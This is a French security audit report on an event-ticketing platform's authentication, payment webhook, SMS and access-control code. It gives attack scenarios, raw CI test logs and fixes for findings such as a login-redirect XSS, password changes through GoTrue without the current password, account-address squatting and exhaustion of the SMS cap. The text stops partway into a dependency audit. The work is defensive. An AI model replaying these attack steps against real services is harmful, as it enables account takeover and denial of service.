# Audit de sécurité indépendant — module Événements

- **Date** : 13/11/2026
- **Branche** : `audit/evenements`, ouverte depuis `main` = `0cf8eb8` (code identique à `0889df6`, run 136 vert sur main).
- **Posture** : auditeur externe. Le code et les rapports `docs/lot*-rapport.md` ne sont pas tenus pour vrais ; chaque
  constat est prouvé par un test rouge (sortie brute de la CI) ou par une citation `fichier:ligne`. Ce qui n'est pas
  prouvé est marqué **SUPPOSÉ**.
- **Aucune correction de code** de l'application. Fichiers ajoutés : `tests/audit/*.test.ts` (8 suites) et ce rapport.
  Un seul autre changement : `.github/workflows/verify.yml` déclenche aussi la CI sur `audit/**` (sans lui, la branche
  n'aurait eu aucun run ; voir « Run CI de la branche »).
- **Exécution** : Supabase local uniquement (CI GitHub Actions). Aucun appel au projet distant, `.env.local` et
  `.private/` non lus, aucun numéro réel (numéros de test `+22176/77/78…` générés, adresses IP de documentation
  RFC 5737 / RFC 2544).
- **Référentiels** : OWASP Top 10 2021 (A01…A10) et OWASP API Security Top 10 2023 (API1…API10).

## À lire en premier

**40 constats : 1 CRITIQUE, 6 ÉLEVÉE, 14 MOYENNE, 19 FAIBLE.**

- 9 constats sont prouvés par 12 tests rouges en CI, dans les 8 suites de `tests/audit/`.
- 29 sont prouvés par la lecture du code (`fichier:ligne`).
- 2 restent SUPPOSÉS (AUD-08, AUD-09) : ils dépendent de la configuration de production.

Le cœur du système tient : fonctions SQL réservées au serveur, aucune écriture REST, webhook SamirPay, montant calculé
par le serveur, QR dynamique, une entrée par billet, droit de scanner, remboursements et retraits sous verrou. Aucun vol
d'argent direct ni aucune entrée sans billet n'a été trouvé exploitable sans droit particulier.

Les failles sont aux frontières :

- **la page de connexion**, qui exécute un `javascript:` reçu en paramètre ;
- **GoTrue, appelable directement avec la clé anon publique**, qui contourne les règles que l'application impose dans
  ses propres routes : inscription, mot de passe, code de connexion par email ;
- **les flux métier sans plafond** : comptes gratuits, stock gardé sans payer, remboursements de doublons, SMS
  « indispensables ».

| Gravité | Nombre | Constats |
|---|---|---|
| CRITIQUE | 1 | AUD-17 |
| ÉLEVÉE | 6 | AUD-01, AUD-02, AUD-03, AUD-08 (supposé), AUD-10, AUD-19 |
| MOYENNE | 14 | AUD-04, AUD-05, AUD-06, AUD-09 (supposé), AUD-13, AUD-14, AUD-18, AUD-20 à AUD-26 |
| FAIBLE | 19 | AUD-07, AUD-11, AUD-12, AUD-15, AUD-16, AUD-27 à AUD-40 |

Les 5 plus graves :

1. **AUD-17 (CRITIQUE)** — Un lien `/login?redirect=javascript:…` envoyé à une victime exécute du code dans le site dès
   qu'elle se connecte et lui vole sa session ; l'attaquant n'a besoin d'aucun compte.
2. **AUD-19** — GoTrue envoie, à la demande de n'importe qui, un code de connexion à l'adresse technique
   `<numéro>@eventvillage.sn` de chaque compte : qui lit cette boîte, ou devine le code, prend le compte.
3. **AUD-02** — Avec le seul jeton d'une session volée, on change le mot de passe chez GoTrue sans le mot de passe
   actuel, et l'alerte « mot de passe modifié » est supprimée par une métadonnée que l'utilisateur écrit lui-même.
4. **AUD-01** — N'importe quel visiteur s'inscrit chez GoTrue avec l'adresse technique d'un numéro et empêche à vie le
   titulaire de ce numéro de s'inscrire.
5. **AUD-03** — L'inscription publique ouvre des comptes sans numéro ni code, en nombre illimité : ils vident le stock
   d'un événement gratuit (prouvé) et rendent sans effet toutes les limites « par compte » (AUD-18, AUD-21).

Viennent ensuite AUD-08, où la limite de connexion de GoTrue devient commune à tous les utilisateurs, et AUD-10,
Next.js 14.2.35 avec des avis critiques.

**Correctifs les plus rentables**, une journée de travail en tout :

| Correctif | Constats réglés |
|---|---|
| Filtrer `redirect` dans `resolvePostLoginRoute` | AUD-17 |
| Fermer l'inscription publique de GoTrue | AUD-01, AUD-03 |
| Activer `secure_password_change` | AUD-02 |
| Déplacer la marque « coquille » hors de `user_metadata` | AUD-02 |
| Rendre l'adresse technique non routable | AUD-19 |
| Ajouter le statut aux quatre aides RLS | AUD-06 |

---

## 1. Constats

### AUD-01 — Un visiteur bloque définitivement l'inscription du titulaire de n'importe quel numéro

- **Gravité** : ÉLEVÉE · **Catégorie** : A04:2021 Insecure Design, A07:2021 Identification and Authentication Failures ; API2:2023 Broken Authentication
- **Statut** : PROUVÉ (test rouge `tests/audit/aud-01-comptes-gotrue.test.ts`, suite « AUD-01 »)
- **Scénario** :
  1. L'attaquant, sans compte, choisit un numéro de téléphone (le sien d'un concurrent, d'un client, ou une liste).
  2. Il appelle GoTrue directement avec la clé anon publique : `POST /auth/v1/signup {"email":"221771234567@eventvillage.sn","password":"…"}`.
     L'inscription publique est ouverte (`supabase/config.toml:163` `enable_signup = true`, et prévue ouverte en
     production : `docs/deploiement-projet-neuf.md:23` « inscription publique : activée ») alors que l'application n'en
     a pas besoin : ses comptes sont créés par `auth.admin.createUser` (`app/api/auth/register/route.ts:166-177`).
  3. Le trigger `handle_new_user` crée aussitôt la ligne `public.users` ACTIF/CLIENT, même pour un compte non confirmé
     (`supabase/migrations/20261031000002_lot1a_failles_sans_privilege.sql:32-49`).
  4. Le titulaire du numéro s'inscrit : `register/start` ne cherche que par numéro (`app/api/auth/register/start/route.ts:46`)
     et envoie le SMS (payé) ; `register` cherche ensuite l'adresse technique `<numéro>@eventvillage.sn`
     (`lib/auth/account-sync.ts:16-17`, `app/api/auth/register/route.ts:128`) ou, si une adresse a été saisie, échoue à
     `createUser` (« already registered ») : réponse 409 `ACCOUNT_ALREADY_EXISTS` (`route.ts:179-184`). Le numéro ne
     peut plus jamais être inscrit ; le refus du domaine `eventvillage.sn` n'existe que dans le schéma Zod de la route,
     pas chez GoTrue.
- **Preuve (sortie brute du run 142)** :
  Journal `runs/142-43360987642/test-logs/tests__audit__aud-01-comptes-gotrue.test.ts.log` :
  ```text
  [AUD-01] signUp(221775933885@eventvillage.sn) : erreur=aucune utilisateur=82045540-ddd4-47d1-98ab-ad0d8eb27937
  [AUD-01] public.users après le signUp : {"id":"82045540-ddd4-47d1-98ab-ad0d8eb27937","status":"ACTIF","phone":null,"email":"221775933885@eventvillage.sn"}
  [AUD-01] register/start : HTTP 200 {"ok":true,"phone":"+221775933885","expires_in":600,"resend_after":60} ; SMS reçus : 1
  [AUD-01] register : HTTP 409 {"error":"Ce numéro de téléphone ou cet email est déjà associé à un compte. Veuillez vous connecter.","code":"ACCOUNT_ALREADY_EXISTS"}
      not ok 1 - le titulaire d'un numéro dont l'adresse technique a été prise par un visiteur peut encore s'inscrire
        error: |-
          inscription du titulaire refusée après le squat de 221775933885@eventvillage.sn par un visiteur : HTTP 409 {"error":"Ce numéro de téléphone ou cet email est déjà associé à un compte. Veuillez vous connecter.","code":"ACCOUNT_ALREADY_EXISTS"}
  
          409 !== 200
  
        code: 'ERR_ASSERTION'
        name: 'AssertionError'
        expected: 200
        actual: 409
        operator: 'strictEqual'
  not ok 1 - AUD-01 — inscription publique GoTrue : squat de l'adresse technique d'un numéro
  ```
- **Correctif recommandé** : désactiver l'inscription publique de GoTrue (`enable_signup = false` en local, « Allow new
  users to sign up » désactivé en production : `auth.admin.createUser` du service_role reste possible) ; faire ignorer
  par `handle_new_user` tout compte dont l'adresse est sur `eventvillage.sn` sans passer par le service_role ; purger les
  comptes déjà créés ainsi (requête sur `auth.users` sans `phone` dont l'email est technique).
- **Effort** : 2 h (réglage + migration + test vert + purge relue).

### AUD-02 — Mot de passe changé avec le seul jeton d'une session, sans le mot de passe actuel, et alerte supprimée par l'utilisateur lui-même

- **Gravité** : ÉLEVÉE · **Catégorie** : A07:2021 Identification and Authentication Failures, A04:2021 Insecure Design ; API2:2023 Broken Authentication
- **Statut** : PROUVÉ (deux tests rouges, suite « AUD-02 » de `tests/audit/aud-01-comptes-gotrue.test.ts`)
- **Scénario** (prérequis : un jeton d'accès volé — appareil partagé ou perdu, XSS, capture) :
  1. `PUT /auth/v1/user {"data":{"is_temporary_controller_account":true}}` avec le jeton : GoTrue écrit
     `raw_user_meta_data`, que l'utilisateur contrôle entièrement.
  2. `PUT /auth/v1/user {"password":"…"}` : accepté sans le mot de passe actuel (`supabase/config.toml:206`
     `secure_password_change = false`), alors que la route applicative l'exige (`app/api/account/password/route.ts:28`,
     `:116`) ; les autres sessions de la victime sont fermées par GoTrue, la sienne non.
  3. Le trigger `notif_on_password_changed` n'émet aucune alerte quand l'ANCIENNE ligne porte la marque « compte
     coquille » (`supabase/migrations/20261109000009_lot9bis_messages.sql:1623-1625`) : la victime n'est pas prévenue.
  4. L'attaquant tient désormais le compte (billets, transferts, données). Pour le détourner jusqu'à l'argent, il lui
     faut encore changer le numéro (`account/phone/start` exige un mot de passe saisi depuis moins de 10 minutes,
     `app/api/account/phone/start/route.ts:33`, qu'il connaît maintenant) : là, deux protections existantes jouent —
     SMS `PHONE_CHANGED` à l'ancien numéro (mis en file par `supabase/migrations/20261109000004_lot9bis_droits.sql:843-853`) et retraits bloqués 24 h après
     un changement de numéro (`supabase/migrations/20261110000005_lot9ter_argent.sql:383-391`).
- **Preuve (sortie brute du run 142)** :
  Journal `runs/142-43360987642/test-logs/tests__audit__aud-01-comptes-gotrue.test.ts.log` :
  ```text
  [AUD-02] PUT /auth/v1/user {password} sans mot de passe actuel : HTTP 200 {"id":"7e4d0d37-37ab-4565-b204-2f01601da1ff","aud":"authenticated","role":"authenticated","email":"parcours-pay-aud-mdp-
  [AUD-02] témoin : PUT {password} HTTP 200 ; lignes PASSWORD_CHANGED : 3
  [AUD-02] PUT {data:{is_temporary_controller_account:true}} : HTTP 200 ; PUT {password} : HTTP 200 ; lignes PASSWORD_CHANGED : 3 → 3
      not ok 1 - GoTrue refuse un nouveau mot de passe présenté avec le seul jeton d’une session (sans le mot de passe actuel)
        error: 'GoTrue accepte un nouveau mot de passe sans le mot de passe actuel : la règle de app/api/account/password (current_password) est contournée'
        code: 'ERR_ASSERTION'
        name: 'AssertionError'
        expected: 200
        actual: 200
        operator: 'notStrictEqual'
      not ok 2 - un changement de mot de passe fait avec le seul jeton d’une session prévient toujours le titulaire
        error: 'mot de passe changé par PUT /auth/v1/user après la marque is_temporary_controller_account posée par le titulaire de la session : aucune alerte PASSWORD_CHANGED (3 → 3)'
        code: 'ERR_ASSERTION'
        name: 'AssertionError'
        expected: true
        actual: false
        operator: '=='
  not ok 2 - AUD-02 — changement de mot de passe direct chez GoTrue sans mot de passe actuel, alerte supprimée
  ```
- **Correctif recommandé** : `secure_password_change = true` (et le réglage équivalent en production) ; ne jamais lire
  une décision de sécurité dans `raw_user_meta_data` : déplacer la marque « coquille » dans `raw_app_meta_data`
  (écrit par le service_role seulement) ou dans une colonne de `public.users`, dans le trigger et dans les trois routes
  qui la lisent (`app/api/controller/setup/route.ts:126`, `app/api/partner/team/invite/route.ts:147`,
  `app/api/partner/team/assignments/route.ts:179`, `:255`).
- **Effort** : 3 h.

### AUD-03 — Des comptes ouverts sans numéro ni code vident le stock d'un événement gratuit

- **Gravité** : ÉLEVÉE · **Catégorie** : A04:2021 Insecure Design ; API6:2023 Unrestricted Access to Sensitive Business Flows
- **Statut** : PROUVÉ (test rouge, suite « AUD-03 » de `tests/audit/aud-01-comptes-gotrue.test.ts`)
- **Scénario** : la règle « un compte = un numéro vérifié par SMS » (inscription « numéro d'abord »,
  `app/api/auth/register/route.ts:66-87`) ne vaut que pour la route de l'application. Par `POST /auth/v1/signup`, un
  script ouvre autant de comptes ACTIF qu'il a d'adresses (en production il faut confirmer l'adresse : un domaine
  « attrape-tout » suffit). `phone_verified_at` n'est contrôlé nulle part (seulement posé :
  `app/api/auth/register/route.ts:203`, `app/api/auth/verify-otp/route.ts:70`, `app/api/controller/setup/route.ts:179`).
  La limite des billets gratuits est par compte et par heure (`app/api/tickets/claim-free/route.ts`, quota
  `claim_free_user`) : chaque faux compte prend ses places, le stock est épuisé, les vrais invités voient « Complet ».
- **Preuve (sortie brute du run 142)** :
  Journal `runs/142-43360987642/test-logs/tests__audit__aud-01-comptes-gotrue.test.ts.log` :
  ```text
  [AUD-03] compte public 0 : {"status":"ACTIF","phone":null,"phone_verified_at":null}
  [AUD-03] claim-free du compte public 0 : HTTP 200 {"success":true,"ticket_ids":["1b6c2efd-28f3-4ece-be82-4dde295e98a5"],"tickets":[{"id":"1b6c2efd-28f3-4ece-be82-4dde295e98a5","ticket_number":"TCK-20261113-43F9DB1D23"}]}
  [AUD-03] compte public 1 : {"status":"ACTIF","phone":null,"phone_verified_at":null}
  [AUD-03] claim-free du compte public 1 : HTTP 200 {"success":true,"ticket_ids":["589e8499-70c0-4125-9373-8a5743f7221d"],"tickets":[{"id":"589e8499-70c0-4125-9373-8a5743f7221d","ticket_number":"TCK-20261113-26F341323E"}]}
  [AUD-03] compte public 2 : {"status":"ACTIF","phone":null,"phone_verified_at":null}
  [AUD-03] claim-free du compte public 2 : HTTP 200 {"success":true,"ticket_ids":["b802f9f1-3002-4c5f-83b8-3b1c7cc7b760"],"tickets":[{"id":"b802f9f1-3002-4c5f-83b8-3b1c7cc7b760","ticket_number":"TCK-20261113-E714193747"}]}
  [AUD-03] catégorie gratuite après les trois comptes publics : {"sold_quantity":3,"total_quantity":3}
      not ok 1 - un compte ouvert sans numéro ni code ne prend pas de billets gratuits
        error: |-
          des comptes ouverts par l'inscription publique, sans numéro vérifié, ont pris 3 billet(s) gratuit(s) sur 3 (stock épuisé : {"sold_quantity":3,"total_quantity":3})
          + actual - expected
  
          + [
          +   200,
          +   200,
          +   200
          + ]
          - []
  
        code: 'ERR_ASSERTION'
        name: 'AssertionError'
        expected:
        actual:
          0: 200
          1: 200
          2: 200
        operator: 'deepStrictEqual'
  not ok 3 - AUD-03 — compte de l'inscription publique (sans numéro vérifié) et billets gratuits
  ```
- **Correctif recommandé** : fermer l'inscription publique (AUD-01) ; exiger `phone_verified_at` non nul dans
  `requireActiveSession` pour les achats et les billets gratuits (ou dans `free_tickets_claim`).
- **Effort** : 2 h (après AUD-01).

### AUD-04 — Le journal du webhook SamirPay accepte des corps de taille illimitée de n'importe qui

- **Gravité** : MOYENNE · **Catégorie** : A04:2021 Insecure Design ; API4:2023 Unrestricted Resource Consumption
- **Statut** : PROUVÉ (test rouge `tests/audit/aud-04-webhook-journal.test.ts`)
- **Scénario** : `POST /api/webhooks/samirpay` est public. Le corps est lu en entier sans taille maximale
  (`lib/payments/webhook.service.ts:46-47`) et enregistré dans `payment_webhook_events.raw_body` (TEXT sans borne,
  `supabase/migrations/20261031000016_lot2_journal_webhooks.sql:14`) par `payment_webhook_record` (`:36-54`) AVANT la
  signature (`webhook.service.ts:81-86`), le format (`:88-91`) et le jeton (`:99-101`) ; chaque corps différent crée une
  ligne. Aucun quota, aucune purge (aucune suppression de `payment_webhook_events` dans les migrations). Un script
  remplit la base (quota de stockage du projet, sauvegardes, temps des requêtes de réconciliation), y compris quand
  `SAMIRPAY_WEBHOOK_SECRET` est défini. Le reste de la chaîne du webhook est sain (voir section 4).
- **Preuve (sortie brute du run 142)** :
  Journal `runs/142-43360987642/test-logs/tests__audit__aud-04-webhook-journal.test.ts.log` :
  ```text
  [AUD-04] réponse HTTP 401 ; lignes du journal pour aud04-6a6914f90d69 : [{"id":"03588bba-6858-4a1c-a904-37e31a9da3d6","result":"REJECTED_SIGNATURE","result_detail":"signature absente","token_present":false,"order_id":"aud04-6a6914f90d69","raw_body_length":1048623}]
      not ok 1 - un corps d'un mégaoctet non signé et sans jeton n'est pas conservé dans payment_webhook_events
        error: |-
          un inconnu a écrit 1 ligne(s) dans payment_webhook_events (raw_body de 1048623 caractères) malgré SAMIRPAY_WEBHOOK_SECRET défini et sans signature ni jeton
          + actual - expected
  
          + [
          +   1048623
          + ]
          - []
  
        code: 'ERR_ASSERTION'
        name: 'AssertionError'
        expected:
        actual:
          0: 1048623
        operator: 'deepStrictEqual'
  not ok 1 - AUD-04 — webhook SamirPay : journal écrit sans limite avant toute vérification
  ```
- **Correctif recommandé** : refuser tout corps au-delà de quelques kilo-octets avant lecture (`content-length` puis
  lecture bornée) ; enregistrer seulement après le contrôle du jeton (ou tronquer `raw_body` et compter les rejets par IP) ;
  purge planifiée des rejets au-delà de 30 jours.
- **Effort** : 2 h.

### AUD-05 — N'importe quel visiteur épuise le plafond journalier global des SMS : plus aucun code pour personne

- **Gravité** : MOYENNE (ÉLEVÉE si l'en-tête `x-forwarded-for` n'est pas réécrit par l'hébergeur, voir AUD-09) · **Catégorie** : API4:2023 Unrestricted Resource Consumption, API6:2023
- **Statut** : PROUVÉ (test rouge `tests/audit/aud-05-sms-plafond-global.test.ts`, plafond abaissé à « consommé + 3 » pour ne pas envoyer 1 000 SMS)
- **Scénario** : chaque code SMS réserve le compteur unique `sms_global/all` (`lib/sms/sms-guard.ts:85-97`, plafond
  `SMS_GLOBAL_DAILY_CAP` = 1 000 par jour par défaut, `lib/env.ts:62`) ; les SMS non indispensables partagent le même
  compteur (`sms-guard.ts:105`). `POST /api/auth/register/start` est anonyme et accepte tout numéro neuf ; seule la limite
  par IP (30 par jour, `lib/env.ts:60`) freine un même client. Avec 34 adresses (ou une seule si `x-forwarded-for` est
  falsifiable), 1 000 démarrages d'inscription vers des numéros quelconques coupent pour le reste de la journée les
  codes d'inscription, de connexion par code, d'activation des contrôleurs, de retrait. `POST /api/auth/send-otp` (objet
  LOGIN, par défaut) envoie aussi un SMS à tout numéro, inscrit ou non (seul l'objet PASSWORD_RESET vérifie le compte :
  `app/api/auth/send-otp/route.ts:59-79`), second déclencheur anonyme du même compteur (relevé par le lecteur « comptes »). Le coût reste borné (c'est le but
  du plafond) mais le service est arrêté à bas prix.
- **Preuve (sortie brute du run 142)** :
  Journal `runs/142-43360987642/test-logs/tests__audit__aud-05-sms-plafond-global.test.ts.log` :
  ```text
  [AUD-05] plafond global réglé à 4 (consommé avant : 1) ; démarrages anonymes : 200, 200, 200 ; client : HTTP 429 {"error":"L'envoi de SMS est momentanément suspendu. Réessayez plus tard ou contactez le support.","code":"SMS_DAILY_CAP_REACHED","retryAfterSeconds":72664} ; SMS reçus par le client : 0
      not ok 1 - trois demandes anonymes vers des numéros quelconques n'empêchent pas un client de recevoir son code
        error: |-
          après 3 demandes anonymes (trois adresses x-forwarded-for inventées), le code d'inscription d'un client est refusé : HTTP 429 {"error":"L'envoi de SMS est momentanément suspendu. Réessayez plus tard ou contactez le support.","code":"SMS_DAILY_CAP_REACHED","retryAfterSeconds":72664}
  
          429 !== 200
  
        code: 'ERR_ASSERTION'
        name: 'AssertionError'
        expected: 200
        actual: 429
        operator: 'strictEqual'
  not ok 1 - AUD-05 — plafond global des SMS consommé par des visiteurs anonymes
  ```
- **Correctif recommandé** : réserver une part du plafond aux numéros déjà connus (connexion, retrait, contrôleurs) et
  plafonner séparément les démarrages d'inscription anonymes ; défi anti-robot (Turnstile/hCaptcha) sur
  `register/start` et `send-otp` ; alerte d'exploitation à 50 % du plafond.
- **Effort** : 4 h.

### AUD-06 — Un partenaire suspendu garde la lecture des paiements de ses acheteurs (aides RLS qui ignorent le statut, suspension sans bannissement)

- **Gravité** : MOYENNE · **Catégorie** : A01:2021 Broken Access Control ; API1:2023 BOLA, API5:2023
- **Statut** : PROUVÉ (deux tests rouges `tests/audit/aud-06-partenaire-suspendu.test.ts` pour l'impact ; test rouge « AUD-06 »
  de `tests/audit/aud-00-catalogue.test.ts` pour la cause, lue dans le catalogue de la base)
- **Scénario** :
  1. `is_partner_owner` (`supabase/migrations/0003_rls.sql:33-38`), `has_role` (`20260906000004_user_roles_multi_role.sql:192-197`),
     `is_controller` (`:214-216`) et `auth_user_role` (`:220`) ne lisent jamais `users.status`, contrairement à
     `is_admin()` (`20261110000001_lot9ter_rls.sql:116-117`). Les politiques `payments_read` (`0003_rls.sql:274`),
     `refunds_read` (`:287`), `event_cancellations_select`, `participant_exports_owner_admin_select` et
     `events_read_public` (brouillons) s'appuient sur `is_partner_owner` sans autre condition. `tickets_read`, elle,
     ajoute un test de statut (`20261103000001_lot6_dette.sql:118-140`, clause lue dans le catalogue, tableau 2) : les
     billets sont protégés, les paiements non.
  2. La suspension (`partner_status_set` → `user_status_set`) passe `users.status` à SUSPENDU et révoque les sessions
     (`20261109000004_lot9bis_droits.sql:505-509`) mais ne bannit pas le compte chez GoTrue (le bannissement n'existe qu'à
     l'anonymisation, `lib/admin/admin.service.ts:348`), et la connexion ne lit pas le statut
     (`app/api/auth/login/route.ts:96`, seuls les refus de GoTrue sont traités, `:33-44`).
  3. Le partenaire suspendu garde donc son jeton une heure (`supabase/config.toml:152`), puis se reconnecte et en obtient
     un neuf ; avec lui il lit par REST les paiements de ses acheteurs : montant, statut, `client_id`, `payer_phone`
     (colonne lisible par `authenticated`, tableau 2). Même effet pour un contrôleur dont le compte n'est pas ACTIF sur
     les données qu'ouvre `is_controller()`.
- **Preuve (sortie brute du run 142)** :
  Journal `runs/142-43360987642/test-logs/tests__audit__aud-06-partenaire-suspendu.test.ts.log` :
  ```text
  [AUD-06] après partner_status_set : users.status=SUSPENDU partners.status=SUSPENDU réponse={"ok":true,"status":"SUSPENDU","user_id":"d9ba2f47-0a74-4da5-a831-4ae95a2408e4","old_status":"VALIDE","partner_id":"3748a8b0-f34e-4f05-a2e9-6258d5a0fa72","is_verified":false,"events_restored":[],"even
  [AUD-06] jeton du partenaire suspendu : billets lus=0 (erreur aucune) ; paiements lus=1 (erreur aucune) ; colonnes : [{"client_id":"5a002001-87cd-4e83-aadd-08839e9c660e","amount":1050,"partner_payout_amount":1000,"status":"SUCCESS","provider_status":"SUCCESS","payer_phone":"775936839","client_idempotency_key":"d5281757-2f32-4c06-bee1-7aa27c26f70a","facial_amount":1000,"refunded_amount":0,"samirpay_net_amount":null}]
  [AUD-06] reconnexion du partenaire suspendu : acceptée ; paiements lus avec le jeton neuf : [{"id":"7dca6267-4c50-4f9d-bcc9-bf6e99f22e30","payer_phone":"775937263","amount":1050,"status":"SUCCESS"}]
      not ok 1 - le jeton d'un partenaire suspendu ne lit plus les billets ni les paiements de ses acheteurs
        error: |-
          un partenaire SUSPENDU lit encore, avec son jeton, les paiements de ses acheteurs, numéro du payeur compris (payments_read repose sur is_partner_owner, qui ignore le statut)
          + actual - expected
  
            {
          +   payments: 1,
          -   payments: 0,
              tickets: 0
            }
  
        code: 'ERR_ASSERTION'
        name: 'AssertionError'
        expected:
          tickets: 0
          payments: 0
        actual:
          tickets: 0
          payments: 1
        operator: 'deepStrictEqual'
      not ok 2 - un partenaire suspendu ne peut pas obtenir un nouveau jeton qui lit encore les paiements de ses acheteurs
        error: |-
          un partenaire SUSPENDU se reconnecte et relit, avec un jeton neuf, les paiements de ses acheteurs, numéro du payeur compris (aucun bannissement, aucun contrôle du statut)
  
          1 !== 0
  
        code: 'ERR_ASSERTION'
        name: 'AssertionError'
        expected: 0
        actual: 1
        operator: 'strictEqual'
  not ok 1 - AUD-06 — partenaire suspendu : lectures REST qui ignorent le statut (is_partner_owner)
  ```
  Journal `runs/142-43360987642/test-logs/tests__audit__aud-00-catalogue.test.ts.log` :
  ```text
      not ok 1 - AUD-06 : chaque aide RLS exécutable par les rôles API tient compte du statut du compte
        error: |-
          aides RLS qui ignorent le statut du compte (SUSPENDU, SUPPRIME) : auth_user_role, has_role, is_controller, is_partner_owner
          + actual - expected
  
          + [
          +   'auth_user_role',
          +   'has_role',
          +   'is_controller',
          +   'is_partner_owner'
          + ]
          - []
  
        code: 'ERR_ASSERTION'
        name: 'AssertionError'
        expected:
        actual:
          0: 'auth_user_role'
          1: 'has_role'
          2: 'is_controller'
          3: 'is_partner_owner'
        operator: 'deepStrictEqual'
  ```
- **Correctif recommandé** : ajouter le test `users.status = 'ACTIF'` aux quatre aides (comme `is_admin()`) ; bannir le
  compte chez GoTrue à la suspension (`ban_duration`) et le débannir à la réactivation ; réduire `jwt_expiry` à 900 s.
- **Effort** : 3 h.

### AUD-07 — Un visiteur sait si un numéro a un compte

- **Gravité** : FAIBLE · **Catégorie** : A07:2021 (énumération de comptes) ; API3:2023 Broken Object Property Level Authorization (exposition)
- **Statut** : PROUVÉ (test rouge `tests/audit/aud-07-enumeration-comptes.test.ts`)
- **Scénario** : `POST /api/auth/resolve-phone` répond 200 pour un numéro inscrit et 404 pour un numéro libre
  (`app/api/auth/resolve-phone/route.ts:62-67`) ; `register/start` répond 409 `PHONE_ALREADY_REGISTERED`
  (`app/api/auth/register/start/route.ts:46-50`) sans aucun quota avant cette réponse, et `register` répond 409 sur le
  numéro ou l'email avant son premier quota (`app/api/auth/register/route.ts:128` contre `:151`) ; `send-otp` en
  réinitialisation répond 429 à la 4e demande en 15 minutes seulement si le compte existe (réponse neutre sans quota
  sinon : `app/api/auth/send-otp/route.ts:73-84`). Les deux derniers vecteurs ont été relevés par les lecteurs
  « comptes » et « coûts » et revérifiés. La seule limite de `resolve-phone` est par IP (AUD-09). Usage : constituer une liste de
  clients d'Event Village pour de l'hameçonnage par SMS. C'est un choix d'ergonomie (« numéro d'abord ») ; il doit être
  assumé et freiné.
- **Preuve (sortie brute du run 142)** :
  Journal `runs/142-43360987642/test-logs/tests__audit__aud-07-enumeration-comptes.test.ts.log` :
  ```text
  [AUD-07] numéro inscrit : HTTP 200 {"success":true} ; numéro libre : HTTP 404 {"error":"Aucun compte n'est associé à ce numéro de téléphone. Veuillez vous inscrire."}
      not ok 1 - resolve-phone répond la même chose pour un numéro inscrit et pour un numéro libre
        error: |-
          resolve-phone révèle l'existence d'un compte : HTTP 200 (inscrit) contre 404 (libre)
  
          200 !== 404
  
        code: 'ERR_ASSERTION'
        name: 'AssertionError'
        expected: 404
        actual: 200
        operator: 'strictEqual'
  not ok 1 - AUD-07 — énumération des comptes par numéro
  ```
- **Correctif recommandé** : réponse identique (« si un compte existe, un code a été envoyé ») et défi anti-robot ; à défaut,
  limite par IP plus basse et journal des rafales.
- **Effort** : 2 h.

### AUD-08 — La limite de connexions de GoTrue s'applique à l'adresse du serveur : quelques dizaines d'échecs bloquent toutes les connexions

- **Gravité** : ÉLEVÉE · **Catégorie** : API4:2023 Unrestricted Resource Consumption, A04:2021 Insecure Design
- **Statut** : SUPPOSÉ (code prouvé ; comportement de la limite de GoTrue en production à confirmer en préproduction ;
  non testé en CI : il faudrait épuiser la limite de l'instance locale, ce qui casserait toutes les suites suivantes)
- **Scénario** : toutes les connexions par mot de passe sont faites par le serveur Next
  (`app/api/auth/login/route.ts:96` → `serverPasswordSignIn`, `lib/auth/password-confirm.ts:110-123`, client
  `createServerClient` sans en-tête d'IP du client, `:110-119`), de même que les confirmations de mot de passe
  (`lib/auth/password-confirm.ts:52-58`) et le changement de mot de passe des contrôleurs
  (`app/api/controller/profile/route.ts:143-153`). GoTrue limite les connexions par adresse IP (local :
  `supabase/config.toml:185`, 300 par 5 minutes ; production : « valeurs par défaut de Supabase »,
  `docs/deploiement-projet-neuf.md:25`) : il ne voit qu'une adresse, celle du serveur. La limite applicative
  `password_login_ip` (30 par heure et par IP client, `app/api/auth/login/route.ts:66-67`) ne protège pas ce compteur
  commun : quelques clients (ou un seul si AUD-09) qui échouent en boucle épuisent la limite de GoTrue et chaque
  utilisateur reçoit `LOGIN_RATE_LIMITED` (`route.ts:39-40`). Un jour d'affluence (ouverture des portes), les
  connexions légitimes seules peuvent l'atteindre.
- **Preuve** : citations ci-dessus.
- **Correctif recommandé** : transmettre l'IP du client à GoTrue (en-tête configuré comme clé de limite côté Supabase,
  ou connexion faite par le navigateur avec la clé anon et l'IP réelle) ; vérifier en préproduction la valeur de la
  limite « sign-ins » et la relever pour l'adresse du serveur ; test de charge de la connexion avant l'ouverture des ventes.
- **Effort** : 4 h + essai en préproduction.

### AUD-09 — Toutes les limites par IP lisent `x-forwarded-for`, que le client écrit

- **Gravité** : MOYENNE · **Catégorie** : API4:2023 Unrestricted Resource Consumption, A05:2021 Security Misconfiguration
- **Statut** : SUPPOSÉ (dépend de l'hébergeur, non choisi : `docs/deploiement-projet-neuf.md`)
- **Scénario** : `getClientIp` prend la première valeur de `x-forwarded-for` (`lib/security/client-ip.ts:25-29`, défaut
  `CLIENT_IP_SOURCE = x-forwarded-for`, `lib/env.ts:121`). Le commentaire du fichier (`:6-9`) le dit : fiable seulement
  derrière un proxy qui réécrit l'en-tête (Vercel le fait). Ailleurs (VPS, Docker, nginx qui ajoute), chaque valeur
  inventée ouvre un compteur neuf : limites des SMS par IP (AUD-05), `resolve-phone` (AUD-07), connexion
  (`password_login_ip`), dépôt anonyme de pièces de 10 Mo (`app/api/partner/documents/upload/route.ts:32-34`),
  inscription partenaire. Les tests de la CI posent eux-mêmes des `x-forwarded-for` différents à chaque appel.
- **Preuve** : citations ci-dessus.
- **Correctif recommandé** : choisir l'hébergeur ; si ce n'est pas Vercel, `CLIENT_IP_SOURCE=x-real-ip` posé par le
  proxy de confiance, et test de démarrage qui refuse `x-forwarded-for` hors liste de proxies.
- **Effort** : 1 h (décision + réglage).

### AUD-10 — Dépendances de production avec failles connues (Next.js critique)

- **Gravité** : ÉLEVÉE (à confirmer avis par avis) · **Catégorie** : A06:2021 Vulnerable and Outdated Components
- **Statut** : PROUVÉ pour la présence des versions (sortie de `npm audit --omit=dev`) ; applicabilité de chaque avis SUPPOSÉE
- **Constat** : `next@14.2.35` (critique : 25 avis, dont exécution de code à distance par l'API d'optimisation d'images
  avec AVIF ou SVG — le format AVIF est activé, `next.config.mjs:49` —, contournement de middleware, empoisonnement de
  cache, déni de service des composants serveur), `sharp@0.33.5` (libvips, libheif, librsvg), `zod@3.25.76` (épuisement
  mémoire sur des collections bornées), `postcss` (dans next), `source-map-js`. Aucune mise à jour faite (consigne).
- **Preuve (sortie brute)** :
  Sortie de `npm audit --omit=dev` (13/11/2026, dépendances de `package-lock.json` de main) :
  ```text
  # npm audit report
